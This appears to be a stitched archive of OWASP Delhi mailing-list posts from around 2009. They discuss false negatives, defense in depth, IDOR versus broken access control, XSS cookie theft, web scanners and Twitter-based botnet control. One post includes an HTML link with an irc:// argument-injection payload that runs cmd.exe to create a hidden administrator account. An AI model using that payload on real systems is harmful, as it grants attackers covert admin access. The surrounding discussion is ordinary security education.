Hi Suresh,

I think you are referring to actual SQL injection and XSS
vulnerabilities that were missed by the automated scanning tool.
Those are called as 'false negatives'.
Tools miss plenty of them that is why it is very important that
testers manually check the injection points.

However it is also possible that testers could miss out
vulnerabilities sometimes.
This is why defense in depth is important.

Make sure that the passwords and other sensitive information are not
stored in clear in the database.
The rights of the application account on the DB should be as minimal
as possible and dangerous functions should be turned off at the DB
level.

The cookie parameters like secure flag, http-only flag, domain and
path should be set as per recommendations.
If possible use out of band authentication like tokens sent over SMS
etc before users can make critical processes like making money
transfer or changing profile information etc.

Installing a WAF, DB firewall could tip you off when some large scale
exploitation of these vulnerabilities is going on.
Check out ESAPI, it has an Intrusion Detection module, if rightly
tuned to your application environment it could prevent/alert on
exploitation of vulnerabilities.

Cheers,
Lava

OK, If you are looking for a piece of cake, then I would suggest you to
"include" functions in your code that have already been built by experts for
input/output validation anterior to be included in the PHP distributions.
You would not be able to find any built-in security input/output validation
functions in standard PHP distributions as yet.

Instead you can download and include functions in your code like the famous
"field_validator"  function available here:
http://www.osix.net/modules/article/?id=218.  By doing this you still will
be using Regexs but you do not have to include regexs on each field. You
will use the function call instead.

Hope that helps. Let me know anything else you want to cognize.

Hi All,

I am taking this discussion in a bit different direction. We in security
hear "false positives" and "false negatives" a lot. We need a to understand
these terms in depth, as during any application security assessment exercise
we find vulnerabilities which are nothing but some sort of application
coding/configuration errors. We need to understand more about these errors.

"False positives" and "False negatives" are statistical terms for Type I or
Type II errors respectively. In statistics, the terms *Type I error* (also,
*? error*, or *false positive*) and *type II error* (*? error*, or a *false
negative*) are used to describe possible errors made in a statistical
decision process.
Type I error (False Positive)

*Type I error*, also known as an "*error of the first kind*", an *? error*,
or a "*false positive*": the error of rejecting a null hypothesis when it is
actually true. Plainly speaking, it occurs when we are observing a
difference when in truth there is none. An example of this would be if a
test shows that a woman is pregnant when in reality she is not. Type I error
can be viewed as the error of excessive credulity.

Type II error (False Negative)

*Type II error*, also known as an "*error of the second kind*", a *? error*,
or a "*false negative*": the error of failing to reject a null hypothesis
when it is in fact not true. In other words, this is the error of failing to
observe a difference when in truth there is one. An example of this would be
if a test shows that a woman is not pregnant when in reality she is. Type II
error can be viewed as the error of excessive skepticism.
For more details, please refer following link and mentioned related links:

Hi list,

I do have an idea about Regular expressions and its usages in preventing
XSS and SQL injection.

but the thing is, I want a function which is already written in a
compact manner
so that it tackles all XSS and SQL injection problems.

As a newbie perhaps I would miss some conditions/"malicious strings".

regards
abhi

Dear Suresh,

1) Direct Object Reference Attack works as, 

Most Of the web Applications often refer data stored on the web server using some kind of ID, it might be database key, Some Objet String, many times even included in hidden fields values,  File name Of Might some other kind of Object Referrer ID which they expose to users in web page, ( for example accid, DocID,referID -- www.acme.com/account?cartid=123) 

You can use Tamper Data Or proxies like Burp to find and replace the values.  

Now the attacker will locate these values and try to brutforce it to see can he penetrate into other accounts or can access other data.

For example,

User 1 = www.acme.com/account?cartid=123

Attacker = www.acme.com/account?cartid=125

So if the attacker change his id from 125 to 123 he can access the User 1 Account and the attack will get successful. Now this is just one example there are many other ways to do it.

The main reason is because there no real access control check on those ID's . and the solution is very simple, is Never expose this ID's to users,

For example,

Instead Of www.acme.com/account?cartid=123 just use www.acme.com/account?askdjlk23423kjasjl 

So You need to replace the ID's with the Indirect reference to that object and on the server side you need some kind of mapping which will map it with the stored ID of Authenticated user. Only the server application should now the mapping.


2) Broken Access Control 

It is about how a web application grants access to content and functions to some
users and not others. These checks are performed after authentication,
and govern what ?authorized? users are allowed to do. example forcefull browesing, Access without any rights, Access to critical data without Authorization, etc...

So in simple terms - Authorization - What I Can Do ?

Authentication - Who M I ?

Broken Access Control is one of the reason for Direct Object reference Attack.

And Patching is simple just Implement Good Access Control

Issue: "Broken Access Control" v/s "Insecure Direct Object Reference"



Dear OWASP Delhi,



Thank you all for the overwhelming response to my queries and doubts.



"Broken Access Control" v/s "Insecure Direct Object Reference"



OWASP 2007 version does not have Broken Access Control, so how do we go about if there are broken access control issues in a site ? how do we report it ? Also the basic difference between broken access control and insecure direct object reference. sometimes, it appears that there is a very thin line between them. Pls clarify.



thanks & regards,

Suresh

Suresh,

 

OWASP Delhi Chapter has been conducting similar trainings as part of its
monthly meetings . Request you to take advantage of the same. Also, the
upcoming Securitybyte & OWASP AppSec Asia Conference in November 2009,
features some of the best and unique training sessions (more than 12) on
Secure Coding , OWASP ESAPI, Advanced Web hacking - RIA, AJAX and SOA
etc. These trainings are going to be delivered by some of the best
trainers in the world, most of them from BlackHat and other
International conferences.

Hi Dhruv

 

Thanks for information. It's a nice work you have done providing a detailed
info. Why I asked for details on DDOS on twitter because as per my knowledge
Twitter is running on Amazon cloud computing resources and it can use more
and more resources as required. 

 

I would like to know whether it was infrastructure failure or application
failure. If it was infrastructure failure whether it is security lapses at
Amzon cloud or in twitter application.

Subject: Re: [Owasp-delhi] Twitter failure

 

Twitter has been facing lots of challenges with the scalability due to their
selection of RoR (Ruby on Rails) as a programming framework. As a matter of
fact, they framed the idea with RoR to make it quick launch to market.
Moreover, they weren't really sure about being so lucky and getting so many
followers in a quick span of time. But idea got back to basics after few
months from its launch. Using RoR, one you can build applications approx.
4-5 times faster in comparison to other web programming languages like
PHP/ASP.Net/J2EE/etc. 

If I remember it correctly, then last year Twitter accepted the scalability
limitations and raised venture funding to port entire application from RoR
to php. I am not really sure, if they are still on to it but I am sure it
would be very difficult to port it due to open APIs those have already been
published and used by different applications/portals. Having said that, the
recent service disruption is predicted to be a conflict between Russian
hackers and Georgian blogger(s). Read the full story here:

Cheers!

Issue: XSS and Reflection



Dear OWASP Delhi,



For an actual Session ID  theft, it is actually necessary that the java-scripts in an XSS attack should relect from the server to the victim, a victim is an 'ignorant' application user who least thinks whether the script has come from a 'trusted' site or not ? 



a victim has logged into an application. the attacker send a link with cookie stealing javasacipt, the victim clicks on the link, the javascipt on the links executes sending the session id to the attacker. Does the victim thinks about where the javascripts came from ?



Comments are welcome.



Thanks & regards,

Suresh

Twitter gives you the facility of operating your PC remotely.
People use twitter to send commands to their gtalks and yahoo messengers,
which in turn help to shutdown/operate remotely(in some cases) their
machines.

As always, there are good and bad uses of any technology.

This is enough information to hack into a machine via social engineering.

Hi Shakun,

Checkout this link for Web Servcies Security Testing Framework

http://www.stratsec.net/files/SIFT-Web-Services-Security-Testing-Framework-v1-00.pdf

Though this is bit old...but hope it might be help to you and gives you a
starting point for Security testing of web services.

Here is the link which explains about different tools for testing web
services
http://www.infoworld.com/d/architecture/three-open-source-web-service-testing-tools-get-high-marks-995

Even i'm looking for a good open source tool for testing web servcies apart
from SoapUI. Let me know if you get to know about any other open source tool
and checklist/framework as well.

Thanks
Megha

Thanks Bhaskar for sharing about that app. But given the download stats(6000
odd) is it fair to assume that such tools aren't widely used to carry out
attacks or run botnets ?
Also, is there any reported case of Twitter being used to command botnets ?

Thanks,

Acunetix would be your last choice, unless you have strict budget constraints.

AppScan & WebInspect are the only ones capable of finding Flash
related security issues. Technology wise AppScan is superior since
WebInspect is limited to decompilation. Other scanners who claim to do
Flash testing barely do Flash settings test. So if you have Flash, go
for AppScan. If you have a bit more money include WebInspect as well.
I always believe & realized - more scanners the better.

If you are scanning for malware, only AppScan does that. Now why does
only AppScan do that & no one else? Well ISS is also part of IBM.
AppScan leverages technology from ISS product suite.

If you have Ajax, it would be again AppScan. I have not really seen
others in this aspect.

I have heard good things about Cenzic but it lacks some features that
AppScan & WebInspect boast of. Additionally the later are both matured
technologies.

Excellent point Mayank.

Looking at the usage,  we may assume that the frequency of these attacks is
very minimal and people are using most big portals without interruptions.

The normal method for controlling Botnets is via an IRC channel, usually a
private keyed channel on some obscure network.But, as far as I assume, even
IRC is not safe in every case.  We can have something like the below code to
run sample attack simulations via IRC to run commands remotely :

<html>
  <body>
  <a href='irc:///"%20--nosplash%20-e%20"*run%20cmd.exe*%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>Heaven
and Earth are impartial</a><br>
  </body>
</html>

However, very recently both facebook and twitter had come under attacks that
besieged them with more traffic than they could handle.These were not the
direct botnets but politically motivated DDoS attack aimed at a certain
anti-Russian blogger known as Cyxymu.

The account, which Twitter promptly suspended, issued tweets containing a
single line of text that looked indecipherable to the naked eye. Using
what's known as a base64 decoder, the dispatches pointed to links where
infected computers could receive malware updates.

I  will keep my post very less technical.However the idea is to share that
even commonly used techniques like Base64 encoding proof to be more
vulnerable than they actually are. are not fully secure.One can easliy
google and spam any vulnerable link by base64 encoding via social
engineering. It happens very frequently on orkut.
http://www.opinionatedgeek.com/dotnet/tools/Base64Encode/Default.aspx

The problem is when social engg comes into picture in any of these kind of
attacks. You can have "N" number of guidelines, "X" number of parameters and
documentations to make your application secure.But how do you plan for
a social engineering.

I am sorry for diverting the discussion to a new area.But it seems to be
very much cross linked.


Dhruv, any comments ?


regards
Bhaskar

hi Friends,

I am a new member of OWASP Delhi Chapter. Is this organization also into ISO
27001 / ISMS guidance & services ?

I feel all security aspects should be discussed.

Thanks,
